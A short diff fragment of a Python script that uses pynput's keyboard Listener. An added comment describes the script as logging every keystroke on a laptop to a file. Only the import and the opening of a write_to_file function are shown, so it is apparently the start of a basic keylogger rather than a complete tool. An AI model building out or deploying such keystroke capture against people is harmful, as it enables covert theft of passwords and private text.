@@ -1,3 +1,5 @@
+#This file reads every key stroke of your laptop and saves the typed keys charcater by character in the log file 
+
 from pynput.keyboard import Listener
 def write_to_file(key):
     letter = str(key)
